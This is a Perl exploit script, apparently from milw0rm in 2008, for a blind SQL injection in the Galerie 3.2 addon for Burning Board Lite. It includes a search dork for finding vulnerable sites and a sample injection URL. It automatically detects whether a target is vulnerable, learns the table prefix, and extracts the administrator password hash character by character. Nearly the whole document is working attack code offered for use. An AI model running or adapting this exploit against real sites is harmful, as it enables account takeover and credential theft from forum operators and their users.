#!/usr/bin/perl
#####################################################################################
#
#    Galerie 3.2 (galerie.php) Remote "Blind" SQL Injection
#
#    found by: J0hn.X3r
#    exploit written by: J0hn.X3r and electron1x
#    Date:     05.10.2008
#    Dork: "Galerie 3.2 © 2004 by progressive"
#
#    Contact:
#       J0hn.X3r
#            [+] ICQ:   573813
#            [+] Mail:  J0hn.X3r[at]gmail.com
#       electron1x
#            [+] Mail:  electron1x *at* mail *dot* ru
#
#    Greetz to: nexos, Barbers, -tmh-, Patrick_B, Sector, Loader007, n00bor
#               Mac_Hack, Five-Three-Nine, f0Gx, bizzit, h0yt3r, no_swear_ftW,
#               Lidloses_Auge, Sys-Flaw, Free-hack, Universal Crew & rest :-)
#
#####################################################################################
#
#  First, Galerie 3.2 is an addon for Burning Board Lite.
#
#  http://www.site.com/galerie.php?action=show&pic=10
#
#  If we add a ' to the pic id we get an SQL Error. But the Query is an UPDATE Query, so we can't use UNION.
#
#  We have to try it with a Blind SQL Injection.
#  ( that slow and shitty subquery thingy ;) )
#
#  injection:
#  http://www.site.com/galerie.php?action=show&pic=10'/**/and/**/ascii(substring((SELECT/**/password/**/from/**/bb1_users/**/WHERE/**/userid=1),1,1))>1/*
#
#####################################################################################

use strict;
use warnings;
use LWP::UserAgent;

banner();

my $url = shift || usage($0);
my $usr_id  = shift;
my $keyspace = "0123456789abcdef";

$usr_id = 1 unless ( $usr_id and $usr_id =~ /^\d+$/ );
$url    = 'http://' . $url unless ( $url =~ /^https?:\/\/.+?\/$/ );


# global vars...
our @url          = ( "$url/galerie.php?action=show&pic={id}%27+and+ascii(substring((SELECT+password+from+bb2_users+where+userid=$usr_id),1,1))", '', '/*' );
our $ua           = LWP::UserAgent->new;
$ua->agent('Mozilla/4.8 [en] (Windows NT 6.0; U)'); # btw we dont use windows ..

# regexes..
our $regex        = 'Bild\ \d+\ von\ (\d+)';
my  $prefix_regex = '(\w+)_galeriedata';
my  $regex_id     = 'pic=(\d+)';

my  $prefix       = '';
my  $pic_id       = '';

print "[~] Preparing attack...\n";
my $r = $ua->get($url . "/galerie.php?action=show&pic=%27");
        die   "\t[!!] Couldnt connect to $url!\n"             unless ( $r->is_success );
        die   "\t[!!] Target doesnt seem to be vulnerable!\n" unless ( $r->content =~ /$prefix_regex/ );
        print "\t[*] Target seems to be vulnerable\n";
        $prefix = $1;
        $url[0] =~ s/bb2/$prefix/;

$r    = $ua->get($url . "/galerie.php");
        die   "\t[!!] Couldnt get a valid pic-id\n" unless ( $r->content =~ /$regex_id/ );
        $pic_id = $1;
        $url[0] =~ s/{id}/$pic_id/;

        print "\t[*] Using table prefix $prefix\n";
        print "\t[*] Using pic-id $pic_id\n";


print "[~] Unleashing Black Magic...\n";
        print STDERR "\t[*] Getting Hash "; 
                                           

for ( 1..32 ) {
        $url[0] =~ s/\),\d{1,2},/\),$_,/;
        blind( build_array($keyspace), 0, 16);
}
print "\n";



sub banner
{
        print "[~] Galerie 3.2 WBB Lite Addon Blind SQL-Injection Exploit\n";
        print "[~] Written by J0hn.x3r and electron1x\n\n"
}

sub usage
{
        my $script = shift;
        print "[*] Usage\n" ,
                        "\t$script <host> <opt: user id>\n" ,
                        "\tuser id defaults to 1\n" ,
              "[*] Examples\n" ,
                        "\t$script http://example.com/forum/ 2\n" ,
                        "\t$script localhost/board/\n" ,
                        "\t$script localhost 31337\n";
        exit(0);
}



sub blind
{
        my ( $keyspace,  $bottom, $top ) = @_;
        my $center = int ($bottom+$top)/2;
        print STDERR chr $$keyspace[$center];
        if ( request($$keyspace[$center], '=')) {
                return;
        } elsif ( $top-$bottom > 0) {
                        print STDERR "\b";
                        return blind($keyspace, $center+1, $top   )
                                unless  (  request($$keyspace[$center], '<') );
                        return blind($keyspace, $bottom, $center-1);
        } else {
                print STDERR "\n[!!] Something went wront, dunno what..\n";
                exit(1);
        }
}

sub build_array
{
        my @sorted = sort {$a<=>$b} map {ord} $_[0] =~ /./g;
        return \@sorted;
}


sub request
{
        my ( $key, $flag ) = @_;
        my $r = $ua->get($url[0] . $flag . $url[1] . $key . $url[2]);
        $r->content =~ /$regex/;
        return ($1 > 0);
}

__END__

# milw0rm.com [2008-10-05]